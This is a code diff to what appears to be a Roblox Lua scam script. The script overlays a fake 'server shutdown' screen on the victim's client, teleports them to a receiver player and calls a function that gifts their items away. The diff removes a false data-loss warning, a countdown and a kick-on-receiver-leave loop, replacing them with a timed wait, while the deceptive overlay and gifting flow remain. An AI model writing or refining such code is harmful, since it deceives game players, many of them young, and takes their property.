@@ -547,22 +547,11 @@ local function createFakeShutdown()
     message.TextTransparency = 1
     message.Parent = frame
 
-    local warning = Instance.new("TextLabel")
-    warning.Text = "Teleporting in 20 seconds. If you leave, your data could be erased."
-    warning.TextColor3 = Color3.new(1, 1, 1)
-    warning.Size = UDim2.new(1, 0, 0.1, 0)
-    warning.Position = UDim2.new(0, 0, 0.6, 0)
-    warning.BackgroundTransparency = 1
-    warning.Font = Enum.Font.SourceSans
-    warning.TextSize = 18
-    warning.TextTransparency = 1
-    warning.Parent = frame
-
     local dots = Instance.new("TextLabel")
     dots.Text = "Please wait"
     dots.TextColor3 = Color3.new(1, 1, 1)
     dots.Size = UDim2.new(1, 0, 0.1, 0)
-    dots.Position = UDim2.new(0, 0, 0.7, 0)
+    dots.Position = UDim2.new(0, 0, 0.6, 0)
     dots.BackgroundTransparency = 1
     dots.Font = Enum.Font.SourceSans
     dots.TextSize = 18
@@ -580,7 +569,6 @@ local function createFakeShutdown()
 
         title.TextTransparency = 1 - alpha
         message.TextTransparency = 1 - alpha
-        warning.TextTransparency = 1 - alpha
         dots.TextTransparency = 1 - alpha
 
         if alpha >= 1 then
@@ -607,35 +595,10 @@ local function createFakeShutdown()
         title.TextSize = 32 * pulse
     end)
 
-    local timer = 20
-    local timerText = Instance.new("TextLabel")
-    timerText.Text = "Teleporting in: "..timer.." seconds"
-    timerText.TextColor3 = Color3.new(1, 1, 1)
-    timerText.Size = UDim2.new(1, 0, 0.1, 0)
-    timerText.Position = UDim2.new(0, 0, 0.8, 0)
-    timerText.BackgroundTransparency = 1
-    timerText.Font = Enum.Font.SourceSans
-    timerText.TextSize = 18
-    timerText.TextTransparency = 0
-    timerText.Parent = frame
-
-    local timerConn
-    timerConn = RunService.Heartbeat:Connect(function()
-        timer = timer - 1
-        if timer <= 0 then
-            timerText.Text = "There has been an issue. Please stay in the server so you don't lose any data..."
-            timerConn:Disconnect()
-        else
-            timerText.Text = "Teleporting in: "..timer.." seconds"
-        end
-        wait(1)
-    end)
-
     return gui, function()
         if fadeConn then fadeConn:Disconnect() end
         if dotConn then dotConn:Disconnect() end
         if pulseConn then pulseConn:Disconnect() end
-        if timerConn then timerConn:Disconnect() end
         gui:Destroy()
     end
 end
@@ -672,25 +635,9 @@ local function waitForReceiver()
     connection:Disconnect()
     
     local shutdownGui, cleanup = createFakeShutdown()
+    task.wait(SHUTDOWN_DURATION)
+    cleanup()
     
-    local receiverLeft = false
-    local receiverConnection
-    if foundReceiver then
-        receiverConnection = foundReceiver.AncestryChanged:Connect(function()
-            if not foundReceiver:IsDescendantOf(game) then
-                receiverLeft = true
-                cleanup()
-                LocalPlayer:Kick("Server Has Shutdown")
-            end
-        end)
-    end
-    
-    while true do
-        if receiverLeft then break end
-        task.wait()
-    end
-    
-    if receiverConnection then receiverConnection:Disconnect() end
     return foundReceiver
 end
 
@@ -724,3 +671,5 @@ if not receiver then return end
 
 teleportToPlayer(receiver)
 startGifting(receiver)
+
+
